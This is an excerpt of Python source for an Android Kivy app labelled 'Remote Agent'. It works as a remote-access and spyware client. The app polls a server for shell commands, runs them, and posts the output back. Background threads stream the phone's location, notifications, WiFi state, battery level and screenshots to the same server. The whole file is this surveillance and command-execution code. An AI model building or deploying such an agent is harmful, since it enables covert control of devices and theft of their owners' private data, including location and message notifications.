...
def check_connection():
    while True:
        try:
            requests.get(f"{SERVER}/status", headers=HEADERS, timeout=5)
        except:
        ...
        try:
            ...
            if level:
                ...
                if number <= 20:
                    requests.post(
                        f"{SERVER}/result",
                        json={"type": "battery_alert", "output": f"Battery low: {number}%"},
    ...
    while True:
        try:
            ...
            if location:
                requests.post(
                    f"{SERVER}/result",
                    json={"type": "location", "output": location},
                    headers=HEADERS, timeout=10
                )
        except Exception as e:
...
def take_screenshot():
    try:
        subprocess.run("screencap -p /sdcard/screen.png", shell=True, timeout=10)
        import base64
        with open("/sdcard/screen.png", "rb") as f:
            img_data = base64.b64encode(f.read()).decode()
        requests.post(
            f"{SERVER}/result",
            json={"type": "screenshot", "output": img_data},
    ...
    while True:
        try:
            ...
            if current_status != last_status:
                requests.post(
                    f"{SERVER}/result",
                    json={"type": "wifi_status", "output": f"WiFi {current_status}: {wifi_info}"},
                    headers=HEADERS, timeout=10
                )
    ...
    while True:
        try:
            ...
            if notifs:
                requests.post(
                    f"{SERVER}/result",
                    json={"type": "notifications", "output": notifs},
                    headers=HEADERS, timeout=10
                )
        except Exception as e:
...
def register(tunnel_url=None):
    try:
        ...
        requests.post(f"{SERVER}/register", json=info, headers=HEADERS, timeout=10)
        print("[+] Registered")
    except Exception as e:
...
def poll_loop(status_label):
    while True:
        try:
            res = requests.get(f"{SERVER}/poll", headers=HEADERS, timeout=10)
            cmd = res.json().get("command")
            if cmd:
                Clock.schedule_once(
                    lambda dt, c=cmd: setattr(status_label, "text", f"Running:\n{c}")
                )
                output = run_command(cmd)
                send_result(cmd, output)
                Clock.schedule_once(
                    lambda dt, o=output: setattr(status_label, "text", f"Last result:\n{o[:300]}")
                )
        except Exception as e:
            Clock.schedule_once(
                lambda dt, err=str(e): setattr(status_label, "text", f"Poll error:\n{err}")
            )
        time.sleep(POLL_INTERVAL)

def startup(status_label):
    def update(msg):
        Clock.schedule_once(lambda dt: setattr(status_label, "text", msg))

    update("Starting agent...")
    register()
    update("Online! Waiting for commands...")

    threading.Thread(target=monitor_battery, args=(status_label,), daemon=True).start()
    threading.Thread(target=track_location, daemon=True).start()
    threading.Thread(target=monitor_wifi, args=(status_label,), daemon=True).start()
...
class AgentApp(App):
    def build(self):
        ...
        title = Label(text="Remote Agent", size_hint_y=None, height=40, bold=True, font_size=20)
        self.status = Label(text="Starting...", halign="left", valign="top", text_size=(None, None))
        scroll = ScrollView()
        scroll.add_widget(self.status)
        layout.add_widget(title)
        layout.add_widget(scroll)

        threading.Thread(target=startup, args=(self.status,), daemon=True).start()
